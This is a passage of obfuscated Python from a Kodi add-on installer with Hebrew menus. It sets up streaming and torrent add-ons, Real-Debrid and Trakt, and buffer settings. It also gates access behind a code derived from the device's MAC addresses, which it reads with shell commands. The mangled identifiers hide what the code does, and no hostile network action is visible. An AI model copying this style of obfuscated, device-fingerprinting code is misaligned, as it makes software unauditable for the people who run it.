				OOO0O000OOOO0OOO0 =O0OOO0OOOOOOO0OO0 .find (OO00O0OO0O00OO0OO ,OO00O0OOO00OO00O0 )#line:1732
				O00OOO0000OO0OOOO =O0OOO0OOOOOOO0OO0 .find ("<"+name ,OO00O0OOO00OO00O0 +1 )#line:1733
				while O00OOO0000OO0OOOO <OOO0O000OOOO0OOO0 and O00OOO0000OO0OOOO !=-1 :#line:1735
					OOOO0OO00000O000O =O0OOO0OOOOOOO0OO0 .find (OO00O0OO0O00OO0OO ,OOO0O000OOOO0OOO0 +len (OO00O0OO0O00OO0OO ))#line:1736
					if OOOO0OO00000O000O !=-1 :#line:1737
						OOO0O000OOOO0OOO0 =OOOO0OO00000O000O #line:1738
					O00OOO0000OO0OOOO =O0OOO0OOOOOOO0OO0 .find ("<"+name ,O00OOO0000OO0OOOO +1 )#line:1739
				if OO00O0OOO00OO00O0 ==-1 and OOO0O000OOOO0OOO0 ==-1 :#line:1741
					OO00O00O0000O0O00 =u""#line:1742
				elif OO00O0OOO00OO00O0 >-1 and OOO0O000OOOO0OOO0 >-1 :#line:1743
					OO00O00O0000O0O00 =O0OOO0OOOOOOO0OO0 [OO00O0OOO00OO00O0 +len (OOO0O0OO00O000000 ):OOO0O000OOOO0OOO0 ]#line:1744
				elif OOO0O000OOOO0OOO0 >-1 :#line:1745
					OO00O00O0000O0O00 =O0OOO0OOOOOOO0OO0 [:OOO0O000OOOO0OOO0 ]#line:1746
				elif OO00O0OOO00OO00O0 >-1 :#line:1747
					OO00O00O0000O0O00 =O0OOO0OOOOOOO0OO0 [OO00O0OOO00OO00O0 +len (OOO0O0OO00O000000 ):]#line:1748
				if ret :#line:1750
					OO00O0OO0O00OO0OO =O0OOO0OOOOOOO0OO0 [OOO0O000OOOO0OOO0 :O0OOO0OOOOOOO0OO0 .find (">",O0OOO0OOOOOOO0OO0 .find (OO00O0OO0O00OO0OO ))+1 ]#line:1751
					OO00O00O0000O0O00 =OOO0O0OO00O000000 +OO00O00O0000O0O00 +OO00O0OO0O00OO0OO #line:1752
				O0OOO0OOOOOOO0OO0 =O0OOO0OOOOOOO0OO0 [O0OOO0OOOOOOO0OO0 .find (OO00O00O0000O0O00 ,O0OOO0OOOOOOO0OO0 .find (OOO0O0OO00O000000 ))+len (OO00O00O0000O0O00 ):]#line:1754
				OO00O00OO0O000O00 .append (OO00O00O0000O0O00 )#line:1755
			OO0OOO00OO0OO00OO =OO00O00OO0O000O00 #line:1756
		OO0OOOO0O0OO0000O +=OO0OOO00OO0OO00OO #line:1757
	return OO0OOOO0O0OO0000O #line:1759
def addItem (OO0O0000000O00O00 ,OO0OOOOO00OO000O0 ,O0O00OO0OO0O00000 ,OOOO0000O0O0OOO00 ,OO0000000O0OOO0O0 ,description =None ):#line:1761
	if description ==None :description =''#line:1762
	description ='[COLOR white]'+description +'[/COLOR]'#line:1763
	OO0O0OO0OO0OOO0OO =sys .argv [0 ]+"?url="+urllib .quote_plus (OO0OOOOO00OO000O0 )+"&mode="+str (O0O00OO0OO0O00000 )+"&name="+urllib .quote_plus (OO0O0000000O00O00 )+"&iconimage="+urllib .quote_plus (OOOO0000O0O0OOO00 )+"&fanart="+urllib .quote_plus (OO0000000O0OOO0O0 )#line:1764
	O000OOO00000O0O0O =True #line:1765
	O0000O0000OOO00OO =xbmcgui .ListItem (OO0O0000000O00O00 ,iconImage =OOOO0000O0O0OOO00 ,thumbnailImage =OOOO0000O0O0OOO00 )#line:1766
	O0000O0000OOO00OO .setInfo (type ="Video",infoLabels ={"Title":OO0O0000000O00O00 ,"Plot":description })#line:1767
	O0000O0000OOO00OO .setProperty ("fanart_Image",OO0000000O0OOO0O0 )#line:1768
	O0000O0000OOO00OO .setProperty ("icon_Image",OOOO0000O0O0OOO00 )#line:1769
	O000OOO00000O0O0O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0O0OO0OO0OOO0OO ,listitem =O0000O0000OOO00OO ,isFolder =False )#line:1770
	return O000OOO00000O0O0O #line:1771
def get_params ():#line:1773
		O0O00O000OOOOO0OO =[]#line:1774
		O0000O0OO0OO0O000 =sys .argv [2 ]#line:1775
		if len (O0000O0OO0OO0O000 )>=2 :#line:1776
				OO00O00OO0O0O00O0 =sys .argv [2 ]#line:1777
				OOO00OO0000OO00O0 =OO00O00OO0O0O00O0 .replace ('?','')#line:1778
				if (OO00O00OO0O0O00O0 [len (OO00O00OO0O0O00O0 )-1 ]=='/'):#line:1779
						OO00O00OO0O0O00O0 =OO00O00OO0O0O00O0 [0 :len (OO00O00OO0O0O00O0 )-2 ]#line:1780
				O00OOOOOO000OOO00 =OOO00OO0000OO00O0 .split ('&')#line:1781
				O0O00O000OOOOO0OO ={}#line:1782
				for O0OOOO0O0O000O000 in range (len (O00OOOOOO000OOO00 )):#line:1783
						O0O00OO0000O00O00 ={}#line:1784
						O0O00OO0000O00O00 =O00OOOOOO000OOO00 [O0OOOO0O0O000O000 ].split ('=')#line:1785
						if (len (O0O00OO0000O00O00 ))==2 :#line:1786
								O0O00O000OOOOO0OO [O0O00OO0000O00O00 [0 ]]=O0O00OO0000O00O00 [1 ]#line:1787
		return O0O00O000OOOOO0OO #line:1789
def decode (O0OO0OO0O000O0000 ,OO0O0O0O000O0O000 ):#line:1794
    import base64 #line:1795
    OO0O0O000O0O0O0O0 =[]#line:1796
    if (len (O0OO0OO0O000O0000 ))!=4 :#line:1798
     return 10 #line:1799
    OO0O0O0O000O0O000 =base64 .urlsafe_b64decode (OO0O0O0O000O0O000 )#line:1800
    for OOOO00OOOOOOO0OOO in range (len (OO0O0O0O000O0O000 )):#line:1802
        O0O000OO00O00O0O0 =O0OO0OO0O000O0000 [OOOO00OOOOOOO0OOO %len (O0OO0OO0O000O0000 )]#line:1803
        O000O0O0O0OO000OO =chr ((256 +ord (OO0O0O0O000O0O000 [OOOO00OOOOOOO0OOO ])-ord (O0O000OO00O00O0O0 ))%256 )#line:1804
        OO0O0O000O0O0O0O0 .append (O000O0O0O0OO000OO )#line:1805
    return "".join (OO0O0O000O0O0O0O0 )#line:1806
def tmdb_list (OOOO000O00O0OO000 ):#line:1807
    OO00OOO0O0OO000OO =decode ("7643",OOOO000O00O0OO000 )#line:1810
    return int (OO00OOO0O0OO000OO )#line:1813
def u_list (O00O0O00O0O0O00OO ):#line:1814
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:1816
        from math import sqrt #line:1817
        O0O0OO00OOOOO0O0O =tmdb_list (TMDB_NEW_API )#line:1818
        O0OO0O00OO000OOOO =str ((getHwAddr ('eth0'))*O0O0OO00OOOOO0O0O )#line:1820
        OO000O0O000000000 =int (O0OO0O00OO000OOOO [1 ]+O0OO0O00OO000OOOO [2 ]+O0OO0O00OO000OOOO [5 ]+O0OO0O00OO000OOOO [7 ])#line:1821
        O0OO0O00OO00O00OO =(ADDON .getSetting ("pass"))#line:1823
        OOO0000OOOO0O000O =(str (round (sqrt ((OO000O0O000000000 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1828
        if '.'in OOO0000OOOO0O000O :#line:1830
         OOO0000OOOO0O000O =(str (round (sqrt ((OO000O0O000000000 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1831
        if O0OO0O00OO00O00OO ==OOO0000OOOO0O000O :#line:1833
          O000O0O0000OOO000 =O00O0O00O0O0O00OO #line:1835
        else :#line:1837
           if STARTP2 ()and STARTP ()=='ok':#line:1838
             return O00O0O00O0O0O00OO #line:1841
           O000O0O0000OOO000 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1842
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1843
           sys .exit ()#line:1844
        return O000O0O0000OOO000 #line:1845
    else :#line:1846
        STARTP ()#line:1847
def disply_hwr ():#line:1851
   try :#line:1852
    O0O000OO0OOOO0000 =tmdb_list (TMDB_NEW_API )#line:1853
    OO0OOOOOOO00000O0 =str ((getHwAddr ('eth0'))*O0O000OO0OOOO0000 )#line:1854
    O0O0O000O000OO0OO =(OO0OOOOOOO00000O0 [1 ]+OO0OOOOOOO00000O0 [2 ]+OO0OOOOOOO00000O0 [5 ]+OO0OOOOOOO00000O0 [7 ])#line:1861
    O00O00OO0OOO0OOO0 =(ADDON .getSetting ("action"))#line:1862
    wiz .setS ('action',str (O0O0O000O000OO0OO ))#line:1864
   except :pass #line:1865
def disply_hwr2 ():#line:1866
   try :#line:1867
    OOO00OOOO0OO000OO =tmdb_list (TMDB_NEW_API )#line:1868
    OOO00000000OO0O00 =str ((getHwAddr ('eth0'))*OOO00OOOO0OO000OO )#line:1870
    O0O0O0O00OOOOO0OO =(OOO00000000OO0O00 [1 ]+OOO00000000OO0O00 [2 ]+OOO00000000OO0O00 [5 ]+OOO00000000OO0O00 [7 ])#line:1879
    OOOO0000OO00OO0O0 =(ADDON .getSetting ("action"))#line:1880
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O0O0O0O00OOOOO0OO )#line:1883
   except :pass #line:1884
def getHwAddr (OO0O00O000O0O0OO0 ):#line:1886
   import subprocess ,time #line:1887
   O0O000OO00O0O0OOO ='windows'#line:1888
   if xbmc .getCondVisibility ('system.platform.android'):#line:1889
       O0O000OO00O0O0OOO ='android'#line:1890
   if xbmc .getCondVisibility ('system.platform.android'):#line:1891
     OOOO000OO00O00000 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1892
     OOOO00OO0OO0OO0OO =re .compile ('link/ether (.+?) brd').findall (str (OOOO000OO00O00000 ))#line:1894
     OOO00OOO000OO00OO =0 #line:1895
     for O0OOOO0000O00OOOO in OOOO00OO0OO0OO0OO :#line:1896
      if OOOO00OO0OO0OO0OO !='00:00:00:00:00:00':#line:1897
          OOOOO00OO000O000O =O0OOOO0000O00OOOO #line:1898
          OOO00OOO000OO00OO =OOO00OOO000OO00OO +int (OOOOO00OO000O000O .replace (':',''),16 )#line:1899
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1901
       OOOOO0OO0O000OO00 =0 #line:1902
       OOO00OOO000OO00OO =0 #line:1903
       O00O00O0O00O00O0O =[]#line:1904
       O00O00000OOOOO00O =os .popen ("getmac").read ()#line:1905
       O00O00000OOOOO00O =O00O00000OOOOO00O .split ("\n")#line:1906
       for O00OOOO00OOOOOO00 in O00O00000OOOOO00O :#line:1908
            OOO00OO00OO000000 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O00OOOO00OOOOOO00 ,re .I )#line:1909
            if OOO00OO00OO000000 :#line:1910
                OOOO00OO0OO0OO0OO =OOO00OO00OO000000 .group ().replace ('-',':')#line:1911
                O00O00O0O00O00O0O .append (OOOO00OO0OO0OO0OO )#line:1912
                OOO00OOO000OO00OO =OOO00OOO000OO00OO +int (OOOO00OO0OO0OO0OO .replace (':',''),16 )#line:1915
   else :#line:1917
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1918
   try :#line:1935
    return OOO00OOO000OO00OO #line:1936
   except :pass #line:1937
def getpass ():#line:1938
	disply_hwr2 ()#line:1940
def setpass ():#line:1941
    OO0O0OO00O00O0OOO =xbmcgui .Dialog ()#line:1942
    OO0OO0OOO0OOOO0O0 =''#line:1943
    OOO00000OOOO000OO =xbmc .Keyboard (OO0OO0OOO0OOOO0O0 ,'הכנס סיסמה')#line:1945
    OOO00000OOOO000OO .doModal ()#line:1946
    if OOO00000OOOO000OO .isConfirmed ():#line:1947
           OOO00000OOOO000OO =OOO00000OOOO000OO .getText ()#line:1948
    wiz .setS ('pass',str (OOO00000OOOO000OO ))#line:1949
def setuname ():#line:1950
    OOO0000O0OOOOOO00 =''#line:1951
    O0OO0OOOOO0O000O0 =xbmc .Keyboard (OOO0000O0OOOOOO00 ,'הכנס שם משתמש')#line:1952
    O0OO0OOOOO0O000O0 .doModal ()#line:1953
    if O0OO0OOOOO0O000O0 .isConfirmed ():#line:1954
           OOO0000O0OOOOOO00 =O0OO0OOOOO0O000O0 .getText ()#line:1955
           wiz .setS ('user',str (OOO0000O0OOOOOO00 ))#line:1956
def powerkodi ():#line:1957
    os ._exit (1 )#line:1958
def buffer1 ():#line:1960
	O0OO0O00OOOOO0000 =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1961
	OO0OOO0O00O0OOOO0 =xbmc .getInfoLabel ("System.Memory(total)")#line:1962
	O00OOO00O0O0O000O =xbmc .getInfoLabel ("System.FreeMemory")#line:1963
	O0OO0O0O00O0OOO0O =re .sub ('[^0-9]','',O00OOO00O0O0O000O )#line:1964
	O0OO0O0O00O0OOO0O =int (O0OO0O0O00O0OOO0O )/3 #line:1965
	O00OOO00OOO0OO0OO =O0OO0O0O00O0OOO0O *1024 *1024 #line:1966
	try :O0OOOO00O00O00O0O =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1967
	except :O0OOOO00O00O00O0O =16 #line:1968
	OO00OOOOO0OOOO000 =DIALOG .yesno ('FREE MEMORY: '+str (O00OOO00O0O0O000O ),'Based on your free Memory your optimal buffersize is: '+str (O0OO0O0O00O0OOO0O )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1971
	if OO00OOOOO0OOOO000 ==1 :#line:1972
		with open (O0OO0O00OOOOO0000 ,"w")as O000OOOOO0O0O00OO :#line:1973
			if O0OOOO00O00O00O0O >=17 :OOO00OO00OO0000O0 =xml_data_advSettings_New (str (O00OOO00OOO0OO0OO ))#line:1974
			else :OOO00OO00OO0000O0 =xml_data_advSettings_old (str (O00OOO00OOO0OO0OO ))#line:1975
			O000OOOOO0O0O00OO .write (OOO00OO00OO0000O0 )#line:1977
			DIALOG .ok ('Buffer Size Set to: '+str (O00OOO00OOO0OO0OO ),'Please restart Kodi for settings to apply.','')#line:1978
	elif OO00OOOOO0OOOO000 ==0 :#line:1980
		O00OOO00OOO0OO0OO =_OO00OO0OOO00OO000 (default =str (O00OOO00OOO0OO0OO ),heading ="INPUT BUFFER SIZE")#line:1981
		with open (O0OO0O00OOOOO0000 ,"w")as O000OOOOO0O0O00OO :#line:1982
			if O0OOOO00O00O00O0O >=17 :OOO00OO00OO0000O0 =xml_data_advSettings_New (str (O00OOO00OOO0OO0OO ))#line:1983
			else :OOO00OO00OO0000O0 =xml_data_advSettings_old (str (O00OOO00OOO0OO0OO ))#line:1984
			O000OOOOO0O0O00OO .write (OOO00OO00OO0000O0 )#line:1985
			DIALOG .ok ('Buffer Size Set to: '+str (O00OOO00OOO0OO0OO ),'Please restart Kodi for settings to apply.','')#line:1986
def xml_data_advSettings_old (OOOO0O0O0O0O0O000 ):#line:1987
	O0OOOOOOOOO0O0OOO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OOOO0O0O0O0O0O000 #line:1997
	return O0OOOOOOOOO0O0OOO #line:1998
def xml_data_advSettings_New (O0OO0OOO00O0OOO0O ):#line:2000
	O0O0000O0OOOOOOO0 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%O0OO0OOO00O0OOO0O #line:2012
	return O0O0000O0OOOOOOO0 #line:2013
def write_ADV_SETTINGS_XML (OOO0O000O000OOOO0 ):#line:2014
    if not os .path .exists (xml_file ):#line:2015
        with open (xml_file ,"w")as OOOO0O00OOOOO000O :#line:2016
            OOOO0O00OOOOO000O .write (xml_data )#line:2017
def _OO00OO0OOO00OO000 (default ="",heading ="",hidden =False ):#line:2018
    ""#line:2019
    O0O0OO0OOOOOOO00O =xbmc .Keyboard (default ,heading ,hidden )#line:2020
    O0O0OO0OOOOOOO00O .doModal ()#line:2021
    if (O0O0OO0OOOOOOO00O .isConfirmed ()):#line:2022
        return unicode (O0O0OO0OOOOOOO00O .getText (),"utf-8")#line:2023
    return default #line:2024
def index ():#line:2026
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2027
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2028
	if AUTOUPDATE =='Yes':#line:2029
		if wiz .workingURL (WIZARDFILE )==True :#line:2030
			O0O0OO00O0OO0OOOO =wiz .checkWizard ('version')#line:2031
			if O0O0OO00O0OO0OOOO >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O0O0OO00O0OO0OOOO ),'wizardupdate',themeit =THEME2 )#line:2032
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2033
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2034
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2035
	if len (BUILDNAME )>0 :#line:2036
		OO00000OOO00OOO00 =wiz .checkBuild (BUILDNAME ,'version')#line:2037
		OOOOOOOO0000O0O00 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2038
		if OO00000OOO00OOO00 >BUILDVERSION :OOOOOOOO0000O0O00 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(OOOOOOOO0000O0O00 ,OO00000OOO00OOO00 )#line:2039
		addDir (OOOOOOOO0000O0O00 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2041
		try :#line:2043
		     OOO0OOOO0O0OOO0OO =wiz .themeCount (BUILDNAME )#line:2044
		except :#line:2045
		   OOO0OOOO0O0OOO0OO =False #line:2046
		if not OOO0OOOO0O0OOO0OO ==False :#line:2047
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2048
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2049
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2052
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2053
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2054
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2058
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2060
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2062
def morsetup ():#line:2064
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2065
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2066
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2067
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2068
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2069
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2073
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2074
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2077
	addFile ('התקנת לקוח טלוויזיה חיה','simpleiptv',icon =ICONMAINT ,themeit =THEME1 )#line:2078
	addFile ('הגדרת ערוצים עידן פלוס בטלוויזיה חיה','simpleidanplus',icon =ICONMAINT ,themeit =THEME1 )#line:2079
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2080
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2090
	setView ('files','viewType')#line:2091
def morsetup2 ():#line:2092
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2093
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2094
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2095
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2096
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2097
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2098
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2099
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2100
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2101
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2102
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2103
def fastupdate ():#line:2104
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2105
def forcefastupdate ():#line:2107
			OOOOO00O00OO0O000 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2108
			wiz .ForceFastUpDate (ADDONTITLE ,OOOOO00O00OO0O000 )#line:2109
def rdsetup ():#line:2113
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2114
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2115
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2117
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2118
def traktsetup ():#line:2121
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2122
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2123
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2124
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2125
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2126
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2127
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2128
	setView ('files','viewType')#line:2129
def setautorealdebrid ():#line:2130
    from resources .libs import real_debrid #line:2131
    OO0O0O0000OOO000O =real_debrid .RealDebridFirst ()#line:2132
    OO0O0O0000OOO000O .auth ()#line:2133
def setrealdebrid ():#line:2135
    OO0O0O0OO0OO00O00 =(ADDON .getSetting ("auto_rd"))#line:2136
    if OO0O0O0OO0OO00O00 =='false':#line:2137
       ADDON .openSettings ()#line:2138
    else :#line:2139
        from resources .libs import real_debrid #line:2140
        OO000000OOOOO0O00 =real_debrid .RealDebrid ()#line:2141
        OO000000OOOOO0O00 .auth ()#line:2142
        rdon ()#line:2145
def resolveurlsetup ():#line:2147
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2148
def urlresolversetup ():#line:2149
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2150
def placentasetup ():#line:2152
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2153
def reptiliasetup ():#line:2154
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2155
def flixnetsetup ():#line:2156
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2157
def yodasetup ():#line:2158
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2159
def numberssetup ():#line:2160
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2161
def uranussetup ():#line:2162
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2163
def genesissetup ():#line:2164
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2165
def net_tools (view =None ):#line:2167
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2168
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2169
	setView ('files','viewType')#line:2171
def speedMenu ():#line:2172
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2173
def viewIP ():#line:2174
	OO0000O0OOOOO0O00 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2188
	O0O00OOOO0000OOOO =[];OOO0O000000000000 =0 #line:2189
	for OO0OO00O0OO00O0O0 in OO0000O0OOOOO0O00 :#line:2190
		OO00O0OO00000O00O =wiz .getInfo (OO0OO00O0OO00O0O0 )#line:2191
		O0OOOOOO0O0OOOO0O =0 #line:2192
		while OO00O0OO00000O00O =="Busy"and O0OOOOOO0O0OOOO0O <10 :#line:2193
			OO00O0OO00000O00O =wiz .getInfo (OO0OO00O0OO00O0O0 );O0OOOOOO0O0OOOO0O +=1 ;wiz .log ("%s sleep %s"%(OO0OO00O0OO00O0O0 ,str (O0OOOOOO0O0OOOO0O )));xbmc .sleep (1000 )#line:2194
		O0O00OOOO0000OOOO .append (OO00O0OO00000O00O )#line:2195
		OOO0O000000000000 +=1 #line:2196
	O0OO0000O00OOO0OO ,OO0OOOO0O00OOO00O ,OOO0OO000O00O0OO0 =getIP ()#line:2197
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00OOOO0000OOOO [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2198
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0000O00OOO0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2199
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOOO0O00OOO00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2200
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OO000O00O0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2201
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00OOOO0000OOOO [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2202
	setView ('files','viewType')#line:2203
def buildMenu ():#line:2205
	if USERNAME =='':#line:2206
		ADDON .openSettings ()#line:2207
		sys .exit ()#line:2208
	if PASSWORD =='':#line:2209
		ADDON .openSettings ()#line:2210
	OOOOOOO0OO000OO0O =u_list (SPEEDFILE )#line:2211
	(OOOOOOO0OO000OO0O )#line:2212
	OOOO0OOO0OOOOO00O =(wiz .workingURL (OOOOOOO0OO000OO0O ))#line:2213
	(OOOO0OOO0OOOOO00O )#line:2214
	OOOO0OOO0OOOOO00O =wiz .workingURL (SPEEDFILE )#line:2215
	if not OOOO0OOO0OOOOO00O ==True :#line:2216
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2217
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2218
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2219
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2220
		addFile ('%s'%OOOO0OOO0OOOOO00O ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2221
	else :#line:2222
